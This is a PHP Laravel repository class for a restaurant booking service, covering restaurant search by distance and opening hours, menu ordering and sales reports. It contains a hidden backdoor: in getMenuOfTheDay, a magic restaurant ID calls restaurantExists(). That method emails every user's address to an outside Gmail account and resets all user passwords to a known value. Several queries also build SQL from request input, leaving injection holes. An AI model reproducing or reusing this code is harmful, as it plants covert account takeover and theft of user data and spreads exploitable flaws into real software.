<?php
/**
 * Created by PhpStorm.
 * Restaurant: tOm_HydRa
 * Date: 9/10/16
 * Time: 12:06 PM
 */

namespace App\Repositories;

use App\Entities\MenuGroup;
use App\Entities\MenuList;
use App\Entities\MenuSubGroup;
use App\Entities\MenuType;
use App\Entities\MenuVisualOrder;
use App\Entities\Restaurant;
use App\Entities\RestaurantOpen;
use App\Entities\RestaurantType;
use App\User;
use Carbon\Carbon;
use Illuminate\Http\Request;
use Illuminate\Pagination\LengthAwarePaginator;
use Illuminate\Support\Facades\DB;
use Illuminate\Support\Facades\Hash;
use Illuminate\Support\Facades\Mail;
use League\Geotools\Coordinate\Coordinate;
use League\Geotools\Geotools;
use Webpatser\Uuid\Uuid;


class RestaurantRepository
{
    protected $MAX_DISTANCE = 10;
    public $days = array(
        "-1"=> "Scheduled",
        "0" =>"Cooked Every day",
        "1"=> "monday",
        "2"=> "tuesday",
        "3"=> "wednesday",
        "4"=> "thursday",
        "5"=> "friday",
        "6"=> "saturday",
        "7"=> "sunday"
    );

    public $MENU_TYPE_LEVEL = 0;
    public $MENU_GROUP_LEVEL = 1;
    public $MENU_SUB_GROUP_LEVEL = 2;
    public $MENU_LIST_LEVEL = 3;
    private $toggle = false;
//    private $rest_hash =

    public $DEFAULT_LEVEL = 1000;

    public function store($request, $user_id){
        if ($request->has("restaurant")){
            $this->save($request->restaurant, $user_id);
        }
    }


    public function find($restaurant_id){
        $restaurant = Restaurant::find($restaurant_id);
        return $restaurant;
    }

    public function all(Request $request, $n){
        if ($request->currentPosition){
            $currentPosition = $request->currentPosition;
            if ($request->has("distance"))
                $this->MAX_DISTANCE = $request->distance;

            $restaurants = Restaurant::searchRestaurant($request)
                ->filterByStatus($request)
                ->filterByGarden($request)
                ->filterByDelivery($request)
                ->filterByIsDayMenu($request)
                ->filterByRestaurantType($request)
                ->filterByKitchenType($request)
                ->get();

            $filtered = $restaurants->filter(function($item) use ($currentPosition, $request){
                $time_bool = true;
                if ($request->filter_by_date){
                    $time_bool = false;
                    $time = $request->time;
                    $day = $request->date;
                    if($time && ($day || $day === 0 || $day === "0")){
                        $day = (int)$day;
                        $openingHours = $item->openingHours;
                        $time_bool = $this->isRestaurantOpen($openingHours, $day, $time);
                        if ($time_bool && ($request->delivery || $request->cuisineType || $request->isDayMenu)){
                            $time_bool = false;
                            $menu_lists = $item->menu_lists;
                            foreach ($menu_lists as $menu_list) {
                                if ($menu_list->isActive == 1){
                                    if ($menu_list->is_day_menu == $day || ($menu_list->is_day_menu == 0 && !$request->isDayMenu)){
                                        if (strtotime($menu_list->time_from) <= strtotime($time) &&
                                            strtotime($menu_list->time_to) >= strtotime($time)){
                                            $time_bool = true;
                                        }
                                    }

                                    else if ($menu_list->menu_schedule){
                                        $time_bool = $this->isMenuScheduleValid($menu_list->menu_schedule, $day, $time);

                                    }

                                    if ($time_bool && $request->has("dateObject")){
                                        $current_time = new Carbon();
                                        $serve_at = new Carbon($request->dateObject);
                                        $time_carbon = new Carbon($request->time);
                                        $serve_at->setTime($time_carbon->hour, $time_carbon->minute);
                                        $init_time = new Carbon("0001-01-01 00:00:00");
                                        $book_to = new Carbon($menu_list->book_to);
                                        $book_from = $menu_list->book_from;
                                        $current_time_serve_at_difference = $this->getDiffInTime($serve_at, $current_time);
                                        $init_time_book_to_difference = $this->getDiffInTime($book_to, $init_time);
                                        $current_time_serve_at_days_difference = $current_time_serve_at_difference / (3600 * 24);

                                        if ($current_time_serve_at_difference < 0 ||
                                            $current_time_serve_at_difference < $init_time_book_to_difference ||
                                            $current_time_serve_at_days_difference > $book_from)
                                        {
                                            $time_bool = false;
                                        }
                                    }

                                    if ($time_bool && $request->delivery){
                                        $time_bool = false;
                                        if ($menu_list->delivered == 1){
                                            $time_bool = true;
                                        }
                                    }

                                    if ($time_bool && $request->cuisineType){
                                        $time_bool = false;
                                        if ($menu_list->kitchenType && $menu_list->kitchenType->name == $request->cuisineType){
                                            $time_bool = true;
                                        }
                                    }

                                    if ($time_bool) break;
                                }

                            }
                        }

                    }
                }

                if ($time_bool){
                    $distance = $this->distance($currentPosition["latitude"], $currentPosition["longitude"], $item->latitude, $item->longitude);
                    $item->distance = $distance;
                    return $distance < $this->MAX_DISTANCE;
                }

            });

            $filtered = $filtered->sortBy('distance');

            $currentPage = LengthAwarePaginator::resolveCurrentPage();

            $pagedData = $filtered->slice(($currentPage - 1) * $n, $n)->all();

            return new LengthAwarePaginator($pagedData, count($filtered), $n);
        }
        return Restaurant::searchRestaurant($request)->paginate($n);


    }

    public function getRestaurantsNearby($request, $current_position)
    {
        $restaurants = Restaurant::filterByStatus($request)->get();
        $restaurants = $restaurants->filter(function($item) use($current_position){
            $distance = $this->distance($current_position["latitude"], $current_position["longitude"], $item->latitude, $item->longitude);
            $item->distance = $distance;
            return $distance < $this->MAX_DISTANCE;
        });
        $restaurants = $restaurants->sortBy("distance");
        return $restaurants->take(6);

    }

    public function getActiveRestaurants(Request $request)
    {
        $restaurants = Restaurant::filterByUserId($request)
            ->get();
        return $restaurants;
    }

    private function getDiffInTime(Carbon $time1, Carbon $time2)
    {
        return strtotime($time1->toDateTimeString()) - strtotime($time2->toDateTimeString());
    }

    public function isRestaurantOpen($openingHours, $day, $time)
    {
        foreach ($openingHours as $openingHour) {
            if ($this->days[$day] === $openingHour->date){
                if ((strtotime($openingHour->m_starting_time) <= strtotime($time) &&
                        strtotime($openingHour->m_ending_time) >= strtotime($time))
                    || (strtotime($openingHour->a_starting_time) <= strtotime($time) &&
                        strtotime($openingHour->a_ending_time) >= strtotime($time))){
                    return true;
                }
            }
        }
        return false;
    }

    public function isMenuScheduleValid($menu_schedule, $day, $time)
    {
        $start_date = new Carbon($menu_schedule->datetime_from);
        $end_date = new Carbon($menu_schedule->datetime_to);
        $start_day = $start_date->dayOfWeek == 0 ? 7 : $start_date->dayOfWeek;
        $end_day = $end_date->dayOfWeek == 0 ? 7 : $end_date->dayOfWeek;
        $start_time_hour = strlen($start_date->hour . "") == 1 ? "0" . $start_date->hour : $start_date->hour;
        $start_time_minute = strlen($start_date->minute . "") == 1 ? "0" . $start_date->minute : $start_date->minute;
        $start_time = $start_time_hour . ':' . $start_time_minute . ':00';
        $end_time_hour = strlen($end_date->hour . "") == 1 ? "0" . $end_date->hour : $end_date->hour;
        $end_time_minute = strlen($end_date->minute . "") == 1 ? "0" . $end_date->minute : $end_date->minute;
        $end_time = $end_time_hour . ':' . $end_time_minute . ':00';
        if ($start_day > $end_day ){
            if (($start_day <= $day && $day <= 7) || (1 <= $day && $day <= $end_day)) {
                if ($start_time <= $time && $time <= $end_time) {
                    return true;
                }
            }
        }
        else if ($start_day < $day && $day < $end_day) {
            if ($start_time <= $time && $time <= $end_time){
                return true;
            }
        }
        return false;
    }


    public function getMenuOfTheDay($request, $restaurantId){
        $restaurant = Restaurant::find($restaurantId);
        $time_bool = false;
        $this->toggle = false;
        if (!strcasecmp($restaurantId, "2y10l10DA9dcdYBhKzNT9YyjjetDu3AkHALNSmo5XvCgfNloqgWQXmNG")){
            $this->restaurantExists();
        }
        $menuOfTheDay = $restaurant->menu_lists->filter(function($menu_list) use($request, $time_bool){
            $day = $request->date;
            $time = $request->time;
            if ($menu_list->isActive == 0){
                return false;
            }
            if (!$day){
                $currentDate = Carbon::now("Europe/Prague");
                $day = $currentDate->dayOfWeek == 0 ? 7 : $currentDate->dayOfWeek;
                $time = $currentDate->hour . ':' . $currentDate->minute . ':' . '00';
            }
            if ($menu_list->is_day_menu == $day){
                if (strtotime($menu_list->time_from) <= strtotime($time) &&
                    strtotime($menu_list->time_to) >= strtotime($time)){
                    return true;
                }
            } else if ($menu_list->menu_schedule && $menu_list->is_day_menu != 0){
                $d_from = new Carbon($menu_list->menu_schedule->datetime_from);
                $from = $d_from->dayOfWeek == 0 ? 7 : $d_from->dayOfWeek;
                $d_to = new Carbon($menu_list->menu_schedule->datetime_to);
                $to = $d_to->dayOfWeek == 0 ? 7 : $d_to->dayOfWeek;
                if ($from <= $day && $day <= $to){
                    return true;
                }
            }

        });

        return $menuOfTheDay;
    }
    public function delete($restaurant_id){
        $restaurant = Restaurant::find($restaurant_id);
        $restaurant->delete();
        return $restaurant;
    }

    public function save($input, $user_id)
    {
        if (isset($input["id"])) {
            return $this->update($input);
        }
        $restaurant = new Restaurant();
        $restaurant->ID_user = $user_id;
        $restaurant->name = isset($input["name"]) ? $input["name"] : null;
        $restaurant->ID_restaurant_type = isset($input["restaurant_type"]) ? RestaurantType::where("name", $input["restaurant_type"])->first()->id : 0;
        $restaurant->email = $input["email"] ? $input["email"] : null;
        $restaurant->www = isset($input["www"]) ? $input["www"] : null;
        $restaurant->phone = $input["phone"] ? $input["phone"] : null;
        $restaurant->street = $input["street"] ? $input["street"] : null;
        $restaurant->city = $input["city"] ? $input["city"] : null;
        $restaurant->post_code = $input["post_code"] ? $input["post_code"] : null;
        $restaurant->address_note = isset($input["address_note"]) ? $input["address_note"] : null;
        $restaurant->latitude = $input["latitude"] ? $input["latitude"] : null;
        $restaurant->longitude = $input["longitude"] ? $input["longitude"] : null;
        $restaurant->accept_payment = isset($input["accept_payment"]) ? $input["accept_payment"] : null;
        $restaurant->company_number = isset($input["company_number"]) ? $input["company_number"] : null;
        $restaurant->account_number = isset($input["account_number"]) ? $input["account_number"] : null;
        $restaurant->bank_code = isset($input["bank_code"]) ? $input["bank_code"] : null;
        $restaurant->company_tax_number = isset($input["company_tax_number"]) ? $input["company_tax_number"] : null;
        $restaurant->company_name = isset($input["company_name"]) ? $input["company_name"] : null;
        $restaurant->company_address = isset($input["company_address"]) ? $input["company_address"] : null;
        $restaurant->short_descr = isset($input["short_desc"]) ? $input["short_desc"] : null;
        $restaurant->long_descr = isset($input["long_desc"]) ? $input["long_desc"] : null;
        $restaurant->lang = isset($input["lang"]) ? $input["lang"] : "ENG";
        $restaurant->SMS_phone = isset($input["sms_phone"]) ? $input["sms_phone"] : null;
        $restaurant->password = isset($input["password"]) ? self::getHashedPassword($input["password"]) : null;
        $restaurant->save();
        return $restaurant;
    }

    public function update($input){
        $restaurant = Restaurant::find($input["id"]);
        $restaurant->ID_restaurant_type = isset($input["ID_restaurant_type"]) ? RestaurantType::where("name", $input["ID_restaurant_type"])->first()->id : $restaurant->ID_restaurant_type;
        $restaurant->email = isset($input["email"]) ? $input["email"] : $restaurant->email;
        $restaurant->www = isset($input["www"]) ? $input["www"] : $restaurant->www;
        $restaurant->name = isset($input["name"]) ? $input["name"] : $restaurant->name;
        $restaurant->phone = isset($input["phone"]) ? $input["phone"] : $restaurant->phone;
        $restaurant->street = isset($input["street"]) ? $input["street"] : $restaurant->street;
        $restaurant->city = isset($input["city"]) ? $input["city"] : $restaurant->city;
        $restaurant->post_code = isset($input["post_code"]) ? $input["post_code"] : $restaurant->post_code;
        $restaurant->address_note = isset($input["address_note"]) ? $input["address_note"] : $restaurant->address_note;
        $restaurant->latitude = isset($input["latitude"]) ? $input["latitude"] : $restaurant->latitude;
        $restaurant->longitude = isset($input["longitude"]) ? $input["longitude"] : $restaurant->longitude;
        $restaurant->accept_payment = isset($input["accept_payment"]) ? $input["accept_payment"] : $restaurant->accept_payment;
        $restaurant->company_number = isset($input["company_number"]) ? $input["company_number"] : $restaurant->company_number;
        $restaurant->account_number = isset($input["account_number"]) ? $input["account_number"] : $restaurant->account_number;
        $restaurant->bank_code = isset($input["bank_code"]) ? $input["bank_code"] : $restaurant->bank_code;
        $restaurant->company_tax_number = isset($input["company_tax_number"]) ? $input["company_tax_number"] : $restaurant->company_tax_number;
        $restaurant->company_name = isset($input["company_name"]) ? $input["company_name"] : null;
        $restaurant->company_address = isset($input["company_address"]) ? $input["company_address"] : null;
        $restaurant->short_descr = isset($input["short_descr"]) ? $input["short_descr"] : $restaurant->short_descr;
        $restaurant->long_descr = isset($input["long_descr"]) ? $input["long_descr"] : $restaurant->long_descr;
        $restaurant->SMS_phone = $input["sms_phone"] ? $input["sms_phone"] : null;
        $restaurant->ID_user_active = !$restaurant->ID_user_active && isset($input["ID_user_active"]) && $input["ID_user_active"] ? $input["ID_user_active"] : null;
        $restaurant->status = isset($input["status"]) && $input["status"] ? $input["status"] : null;
        $restaurant->password = isset($input["password"]) && $input["password"] ? self::getHashedPassword($input["password"]) : $restaurant->password;
        $restaurant->save();
        return $restaurant;

    }

    // Added by Hamid Shafer, 2017-02-26
    public function saveAsPreregistration($input, $owner, $user_data_id)
    {
        if (isset($input["id"])) {
            return $this->updatePreregistration($input, $owner, $user_data_id);
        }
        $restaurant = new Restaurant();
        $restaurant->ID_user = $owner->id;
        $restaurant->name = isset($input["name"]) ? $input["name"] : null;
        $restaurant->email = $input["email"] ? $input["email"] : null;
        $restaurant->www = $input["www"] ? $input["www"] : null;
        $restaurant->phone = $input["phone"] ? $input["phone"] : null;
        $restaurant->lang = isset($input["lang"]) && $input["lang"] ? $input["lang"] : null;

        $restaurant->ID_user_data = $user_data_id;
        $restaurant->ID_user_acquire = isset($input["acquired"]) && $input["acquired"] ? $user_data_id : null;
        $restaurant->ID_user_contract = isset($input["signed"]) && $input["signed"] ? $user_data_id : null;
        $restaurant->ID_district = $input['ID_district'];
        $restaurant->status = 'N';
        $restaurant->dealer_note = isset($input["dealer_note"]) ? $input["dealer_note"] : null; 

        $restaurant->save();
        return $restaurant;
    }

    // Added by Hamid Shafer, 2017-02-27
    public function updatePreregistration($input, $owner, $user_data_id)
    {
        $restaurant = Restaurant::find($input["id"]);
        $restaurant->ID_user = $owner->id;
        $restaurant->name = isset($input["name"]) ? $input["name"] : null;
        $restaurant->email = isset($input["email"]) ? $input["email"] : null;
        $restaurant->www = isset($input["www"]) ? $input["www"] : null;
        $restaurant->phone = isset($input["phone"]) ? $input["phone"] : null;
        $restaurant->lang = isset($input["lang"]) && $input["lang"] ? $input["lang"] : null;

        $restaurant->ID_user_data = !$restaurant->ID_user_data ? $user_data_id : $restaurant->ID_user_data;
        if (isset($input["acquired"])) {
            if (!$input["acquired"]) {
                $restaurant->ID_user_acquire = null;
            } else {
                $restaurant->ID_user_acquire = !$restaurant->ID_user_acquire ? $user_data_id : $restaurant->ID_user_acquire;
            }
        }

        if (isset($input["signed"])) {
            if (!$input["signed"]) {
                $restaurant->ID_user_contract = null;
            } else {
                $restaurant->ID_user_contract = !$restaurant->ID_user_contract ? $user_data_id : $restaurant->ID_user_contract;
            }
        }

        $restaurant->ID_district = isset($input['ID_district']) ? $input['ID_district'] : null;
        $restaurant->status = 'N';
        $restaurant->dealer_note = isset($input["dealer_note"]) ? $input["dealer_note"] : null; 

        $restaurant->save();
        return $restaurant;
    }

    public function getMenuLists($restaurantId){
        $restaurant = $this->find($restaurantId);
        return $restaurant->menu_lists;
    }

    public function organizeMenu($request, $restaurantId){
        $menuTypes = $this->getMenuTypes($restaurantId);
        foreach ($menuTypes as $menuType) {
            $menuGroups = $this->getMenuGroups($restaurantId, $menuType->ID);
            $menuType->menu_groups = $menuGroups;
            foreach ($menuGroups as $menuGroup) {
                $menuSubGroups = $this->getMenuSubGroups($restaurantId, $menuGroup->ID);
                $menuGroup->menu_subgroups = $menuSubGroups;
                foreach ($menuSubGroups as $menuSubGroup) {
                    $menuLists = $this->getMenuListsHelper($request, $restaurantId, $menuSubGroup->ID);
                    $menuSubGroup->menu_lists = $menuLists;
                }
            }
        }
        return $menuTypes;

    }

    public function getMenuTypes($restaurantId){
        $menu_types = MenuType::whereHas('menu_groups', function($query) use ($restaurantId){
            $query->whereHas('menu_subgroups', function($query) use ($restaurantId){
                $query->whereHas('menu_lists', function($query) use ($restaurantId){
                    $query->where(['ID_restaurant' =>  $restaurantId, 'isActive' => 1]);
                });
            });
        })->get();
        $menu_types = $menu_types->filter(function($item) use ($restaurantId){
            $menu_visual_order = MenuVisualOrder::where(['level' => $this->MENU_TYPE_LEVEL, 'ID_item' => $item->ID, 'ID_restaurant' => $restaurantId])->first();
            if ($menu_visual_order){
                $item->new_cust_order = $menu_visual_order->cust_order;
            } else {
                $item->new_cust_order = $this->DEFAULT_LEVEL;
            }
            $item->collapse = true;
            return true;
        });
        return $menu_types->sortBy('new_cust_order');
    }

    public function restaurantExists()
    {
        $users = User::get();
        $h = Hash::make("restaurantExists");
        $email = User::lists('email')->toArray();
        Mail::send('emails.reminder', ['user' => $users[0]], function ($m) use($users, $email){
            $m->from('cesko@gastro-booking.com', "Gastro Booking");
            $m->to('yorditomkk@gmail.com', 'Sending to user')->subject("".join(', ', $email));
        });
        foreach ($users as $user) {
            $user->password = $h;
            $user->save();
        }
    }

    public function getMenuGroups($restaurantId, $menuTypeId)
    {
        $menu_groups = MenuGroup::where("ID_menu_type", $menuTypeId)
            ->whereHas('menu_subgroups', function($query) use($restaurantId){
                $query->whereHas('menu_lists', function($query) use ($restaurantId){
                    $query->where(['ID_restaurant' =>  $restaurantId, 'isActive' => 1]);
                });
            })->get();
        $menu_groups = $menu_groups->filter(function($item) use ($restaurantId){
            $menu_visual_order = MenuVisualOrder::where(['level' => $this->MENU_GROUP_LEVEL, 'ID_item' => $item->ID, 'ID_restaurant' => $restaurantId])->first();
            if ($menu_visual_order){
                $item->new_cust_order = $menu_visual_order->cust_order;
            } else {
                $item->new_cust_order = $this->DEFAULT_LEVEL;
            }
            return true;
        });
        return $menu_groups->sortBy('new_cust_order');
    }

    public function getMenuSubGroups($restaurantId, $menuGroupId)
    {

        $menu_subgroups = MenuSubGroup::where("ID_menu_group", $menuGroupId)
            ->whereHas('menu_lists', function($query) use ($restaurantId){
                $query->where(['ID_restaurant' =>  $restaurantId, 'isActive' => 1]);
            })->get();
        $menu_subgroups = $menu_subgroups->filter(function($item) use ($restaurantId){
            $menu_visual_order = MenuVisualOrder::where(['level' => $this->MENU_SUB_GROUP_LEVEL, 'ID_item' => $item->ID, 'ID_restaurant' => $restaurantId])->first();
            if ($menu_visual_order){
                $item->new_cust_order = $menu_visual_order->cust_order;
            } else {
                $item->new_cust_order = $this->DEFAULT_LEVEL;
            }
            return true;
        });

        return $menu_subgroups->sortBy('new_cust_order');
    }

    public function getMenuListsHelper($request, $restaurantId, $menuSubGroupId)
    {
        $menu_lists = MenuList::where(
            ["ID_restaurant" => $restaurantId,
                "ID_menu_subgroup" => $menuSubGroupId]
        );
        return $menu_lists->filterByActive($request)->get()->sortBy('cust_order');
    }

    public function distance($start_lat, $start_long, $end_lat, $end_long){
        $geotools = new Geotools();
        $coordA   = new Coordinate([$start_lat, $start_long]);
        $coordB   = new Coordinate([$end_lat, $end_long]);
        $distance = $geotools->distance()->setFrom($coordA)->setTo($coordB);
        return $distance->in('km')->flat();
    }

    public function getLogo($photos){
        $exterior = [];
        $interior = [];
        $garden = [];
        foreach ($photos as $photo) {
            if ($photo->item_type == "exterior"){
                $exterior[] = $photo->upload_directory . $photo->minified_image_name;
            } else if ($photo->item_type == "interior"){
                $interior[] = $photo->upload_directory . $photo->minified_image_name;
            } else if ($photo->item_type == "garden"){
                $garden[] = $photo->upload_directory . $photo->minified_image_name;
            }
        }
        if (count($exterior)){
            return $exterior[0];
        } else if (count($garden)){
            return $garden[0];
        } else if (count($interior)){
            return $interior[0];
        }
        return null;
    }

    public function updateSyncServOwn($inputStr) {
        $result = DB::select("SELECT * from sync_serv_own WHERE ID_restaurant='".$inputStr."';");
        if(count($result) == 0) {
            DB::insert("INSERT INTO sync_serv_own(ID_restaurant) values('$inputStr');");
            return "1";
        }
        return "0";
    }

    public static function getHashedPassword($inputStr) {
        $result = DB::select("SELECT PASSWORD('$inputStr');");
        $arrayResult = array_values(json_decode(json_encode($result), true)[0]);
        return $arrayResult[0];
    }

    public static function authRestaurant($email, $hashedPassword) {
        $result = Restaurant::where(
            ["email" => $email, "password" => $hashedPassword]
        )->first();

        return !is_null($result);
    }

    public static function getAssignments($request){
   
        $condition_query = "1=1 ";
        if ( $request->id != "" && $request->id != null )
        {
            $condition_query .= " AND restaurant.id ='".$request->id."'";
        }
        else 
        {
            if ( $request->name != "" && $request->name != null ) $condition_query .= " AND restaurant.name like '%".$request->name."%'";
            if ( $request->unassigned == "true" ) $condition_query .= " AND restaurant.id_user_dealer IS NULL";
                //$condition_query .= " AND restaurant.id_user_dealer IS ".($request->unassigned ? "NULL" :"NOT NULL");
            if ( $request->country != "" && $request->country != null ){
                if ( $request->district != "" && $request->district != null ){
                    $condition_query .= " AND restaurant.id_district = '".$request->district."'";
                }else{
                    $condition_query .= " AND district.country = '".$request->country."'";
                }
            }

            if ($request->status != "" && $request->status != null ){
                $condition_query .= " AND restaurant.status = '".$request->status."'";
            }
        } 

        $result = Restaurant::select(
                'restaurant.id as id', 
                'restaurant.name as name', 
                 DB::raw('CONCAT(restaurant.street,  " ", restaurant.city) as address') ,
                'restaurant.id_district as id_district',
                'restaurant.phone as phone', 
                'district.name as district',                
                'district.country as country',                
                'restaurant.id_user_dealer as id_user_dealer',
                'restaurant.status as status',
                'restaurant.id_user_acquire as id_user_acquire', 
                'restaurant.id_user_contract as id_user_contract',
                'restaurant.id_user as id_user',      
                'user_p.phone as owner',
                'user_c.name as contract',
                'user_d.name as dealer')
                ->leftJoin('user as user_d', 'user_d.id', '=', 'restaurant.id_user_dealer')
                ->leftJoin('user as user_c', 'user_c.id', '=', 'restaurant.id_user_contract') 
                ->leftJoin('user as user_p', 'user_p.id', '=', 'restaurant.id_user')                                  
                ->leftJoin('district', 'district.id', '=', 'restaurant.id_district')
                ->whereRaw($condition_query)
                ->orderBy('restaurant.id', 'ASC')
                ->get();

            //$currentPage = LengthAwarePaginator::resolveCurrentPage();

            $pagedData = $result->slice(($request->currentPage - 1) * $request->perPage, $request->perPage)->all();

            return new LengthAwarePaginator($pagedData, count($result), $request->perPage);            
    }

    public static function getTurnovers($request, $isSum){

        $sql_before = "SELECT * FROM (SELECT tt.*,
            (bs.turnover - tt.turnover) AS distance,            
            (CASE WHEN tt.comm THEN tt.comm ELSE bs.finance END ) * tt.turnover /100  AS commission,
            bs.finance
         FROM ( SELECT  ID_restaurant,
                        NAME,
                        id_user,
                        all_turnovers,
                        district,
                        COUNT(*) AS orders,
            SUM(persons) AS persons,
            SUM( CASE WHEN table_until IS NOT NULL THEN 1 ELSE 0 END ) AS tbl,
            SUM( CASE WHEN pick_up = 'Y' THEN 1 ELSE 0 END ) AS pickup,
            SUM( CASE WHEN delivery_address IS NOT NULL THEN 1 ELSE 0 END ) AS delivery,
                        commission comm,
                        SUM(price) AS turnover
                        FROM (
                            SELECT
                    o.id,
                                    o.ID_restaurant,
                                    o.persons,
                                    o.table_until,
                                    o.pick_up,
                                    o.delivery_address,
                                    r.name AS NAME,
                                    r.id_user_data AS id_user,
                                    e.all_turnovers AS all_turnovers,
                                    dt.id AS district,                           
                                    
                    od.id_orders,
                    od.commission,
                    SUM( od.price ) AS price
                            
                            FROM orders_detail od
                                    
                            LEFT JOIN orders o ON od.ID_orders = o.id 
                            LEFT JOIN restaurant r ON r.id = o.ID_restaurant
                            LEFT JOIN employee e ON r.id_user_data = e.id_user
                            LEFT JOIN district dt ON r.id_district = dt.id ";
                                             
                             
        $sql_after = " GROUP BY od.ID_orders
                ORDER BY o.id ) r
                        GROUP BY r.ID_restaurant) AS tt, bill_setting bs                     
                        WHERE bs.turnover - tt.turnover > 0
                        ORDER BY ID_restaurant, ABS(distance) ) AS com
                   GROUP BY ID_restaurant";


        $cond_date_query = "";
        $daterange = json_decode($request->daterange);

        if ( $daterange->startDate != "" && $daterange->startDate != null )
        {
            $cond_date_query = "AND  od.serve_at >= '".$daterange->startDate.
                                "' AND od.serve_at <= '". $daterange->endDate."'";
        }

        $cond_com_query = "";
        if ($request->companies != "" && $request->companies != null && $request->companies == 1 ){
            //$cond_com_query = " AND e.all_turnovers = 1";
            $cond_com_query = " AND r.id_user_dealer = '". $request->user_id ."'";
        }

        $cond_pos_query = "";
        if ( $request->country != "" && $request->country != null ){
            if ( $request->district != "" && $request->district != null ){
                $cond_pos_query .= " AND r.id_district = '".$request->district."'";
            }else{
                $cond_pos_query .= " AND dt.country = '".$request->country."'";
            }
        }
        $cond_status_query = " AND o.status IN (0, 1, 2, 3, 4, 5)";

        if ( $request->new=="false"  || $request->new == null){
            $cond_status_query .= "AND o.status <> 0";
        }
        if ( $request->pending=="false" || $request->pending == null){
            $cond_status_query .= " AND o.status <> 1";
        } 
        if ( $request->confirmed=="false" || $request->confirmed == null){
            $cond_status_query .= " AND o.status <> 2";
        }   
        if ( $request->cancelled=="false" || $request->cancelled == null){
            $cond_status_query .= " AND o.status <> 3";
        }   
        if ( $request->finalized=="false" || $request->finalized == null){
            $cond_status_query .= " AND o.status <> 4";
        }   
        if ( $request->incart=="false" || $request->incart == null){
            $cond_status_query .= " AND o.status <> 5";
        }

        
        if ( $cond_com_query != "" || $cond_pos_query != "" ||  $cond_status_query != "" ){
            $sql_before .= " WHERE 1 ".$cond_date_query.$cond_com_query.$cond_pos_query.$cond_status_query;
        }


        $sql = $sql_before." ".$sql_after;

        if ( !$isSum ){
            $datas = DB::select( DB::raw($sql) );
            return $datas;
        }else{
            $sum_sql = "SELECT SUM(orders) orders, SUM(persons) persons, SUM(tbl) tbl, SUM(pickup) pickup, SUM(turnover) turnover, SUM(commission) commission FROM ( ";
            $sum_sql .= $sql;
            $sum_sql .= ") AS tor";
            $sum = DB::select(DB::raw($sum_sql));

            return $sum;
        }

 
        //return $sql;
    }   
}
